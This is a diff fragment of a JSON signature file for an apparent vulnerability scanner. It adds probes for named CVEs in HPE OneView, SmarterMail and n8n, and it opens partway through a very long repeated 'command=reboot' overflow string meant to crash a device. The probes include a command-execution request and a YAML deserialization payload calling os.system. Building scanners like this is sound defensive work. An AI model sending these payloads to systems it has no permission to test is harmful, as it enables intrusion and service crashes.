api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A",
+        "indicator": "Segmentation fault",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "[NEW] HPE OneView RCE (CVE-2025-37164)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/rest/id-pools/executeCommand",
+        "data": "{\"command\":\"id\"}",
+        "indicator": "uid=0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] SmarterMail RCE (CVE-2025-52691)",
+        "category": "Email",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/api/v1/settings/sysadmin/upload",
+        "data": "VULN_CHECK_SUCCESS",
+        "indicator": "success",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] n8n Content-Type Confusion RCE (CVE-2026-21858)",
+        "category": "Workflow Automation",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/rest/workflows",
+        "headers": {
+            "Content-Type": "application/x-yaml"
+        },
+        "data": "!!python/object/apply:os.system ['echo VULN_CHECK_SUCCESS']",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200,
+            500
+        ]
     }
 ]
